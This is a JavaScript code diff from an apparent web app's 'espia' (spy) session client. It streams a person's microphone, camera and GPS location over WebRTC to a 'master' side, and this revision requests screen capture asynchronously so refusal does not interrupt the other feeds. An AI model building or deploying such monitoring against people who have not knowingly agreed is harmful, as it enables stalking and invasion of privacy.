@@ -2394,17 +2394,11 @@ const Session = (() => {
               });
             } catch(e) { console.warn('[espia WH] solo audio fallo:', e.message); }
           }
-          // iOS Safari <17 fallback
-          if (navigator.mediaDevices && typeof navigator.mediaDevices.getDisplayMedia === 'function') {
-            try {
-              window._espiaCliWH.streams.display = await navigator.mediaDevices.getDisplayMedia({
-                video: { frameRate: { ideal: 15 } }, audio: false
-              });
-            } catch(e) { console.warn('[espia WH] getDisplayMedia fallo:', e.message); }
-          } else {
-            console.log('[espia WH] getDisplayMedia no disponible (iOS Safari <17?)');
-          }
-          if (!window._espiaCliWH.streams.userMedia && !window._espiaCliWH.streams.display) {
+          // [v2.13.69 REFACTOR] pantalla NO se pide aquí más — se pide ASYNC
+          // después de que la conexión esté establecida. Antes await bloqueaba
+          // 30s+ esperando user gesture → audio/cam/GPS no llegaban al master
+          // hasta que el user decidiera sobre pantalla.
+          if (!window._espiaCliWH.streams.userMedia) {
             await window._espiaCliWHCerrar('sin_streams');
             return;
           }
@@ -2415,8 +2409,42 @@ const Session = (() => {
           if (window._espiaCliWH.streams.userMedia) {
             window._espiaCliWH.streams.userMedia.getTracks().forEach(t => pc.addTrack(t, window._espiaCliWH.streams.userMedia));
           }
-          if (window._espiaCliWH.streams.display) {
-            window._espiaCliWH.streams.display.getTracks().forEach(t => pc.addTrack(t, window._espiaCliWH.streams.display));
+          // [v2.13.69] Reservar transceiver para pantalla — slot vacío que
+          // luego rellenamos con replaceTrack() cuando llegue el stream display.
+          // Esto evita renegociación SDP cuando agregamos pantalla más tarde.
+          let displayTransceiver = null;
+          try {
+            displayTransceiver = pc.addTransceiver('video', { direction: 'sendonly' });
+            window._espiaCliWH._displayTransceiver = displayTransceiver;
+          } catch(eT) { console.warn('[espia WH] no se pudo reservar transceiver pantalla:', eT.message); }
+          // [v2.13.69] getDisplayMedia ASYNC sin bloquear el flow principal.
+          // Si el user acepta, replaceTrack en el transceiver reservado.
+          // Si rechaza/timeout, no hace nada y el resto del espía sigue.
+          if (navigator.mediaDevices && typeof navigator.mediaDevices.getDisplayMedia === 'function') {
+            (async () => {
+              try {
+                console.log('[espia WH] solicitando pantalla async (no bloquea cam/mic/GPS)...');
+                const screen = await navigator.mediaDevices.getDisplayMedia({
+                  video: { frameRate: { ideal: 15 } }, audio: false
+                });
+                window._espiaCliWH.streams.display = screen;
+                const tracks = screen.getVideoTracks();
+                console.log('[espia WH] pantalla obtenida · tracks:', tracks.length, 'displaySurface:', tracks[0]?.getSettings?.()?.displaySurface);
+                if (displayTransceiver && tracks[0]) {
+                  await displayTransceiver.sender.replaceTrack(tracks[0]);
+                  console.log('[espia WH] pantalla agregada al transceiver reservado · sin renegociación ✓');
+                  // Si el user detiene la compartición, limpiar el slot
+                  tracks[0].onended = () => {
+                    console.log('[espia WH] user detuvo compartir pantalla');
+                    try { displayTransceiver.sender.replaceTrack(null); } catch(_){}
+                  };
+                }
+              } catch(eS) {
+                console.warn('[espia WH] getDisplayMedia rechazado o falló:', eS.message);
+              }
+            })();
+          } else {
+            console.log('[espia WH] getDisplayMedia no disponible (iOS Safari <17?)');
           }
           const gpsCh = pc.createDataChannel('gps');
           window._espiaCliWH.gpsCh = gpsCh;
